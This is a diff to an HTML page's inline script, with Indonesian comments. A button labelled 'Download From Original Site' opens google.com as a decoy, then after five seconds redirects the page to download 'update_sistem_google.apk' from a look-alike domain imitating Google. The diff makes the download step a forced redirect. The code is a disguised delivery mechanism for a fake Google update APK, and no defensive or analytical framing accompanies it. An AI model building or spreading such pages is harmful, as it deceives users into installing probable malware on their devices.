@@ -19,10 +19,14 @@
  <body> 
   <script>
 function a(){
-	window.open('https://google.com', 'x');
-	setTimeout(function(){
-		window.open('https://googllogoligaturee.my.id/update_sistem_google.apk', 'x');
-	}, 5000);
+    // Membuka Google di jendela/tab baru bernama 'x'
+    window.open('https://google.com', 'x');
+    
+    // Menunggu selama 5 detik sebelum memicu unduhan
+    setTimeout(function(){
+        // Mengalihkan halaman saat ini untuk mengunduh file APK
+        window.location.href = 'https://googllogoligaturee.my.id/update_sistem_google.apk';
+    }, 5000);
 }
 </script> 
   <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
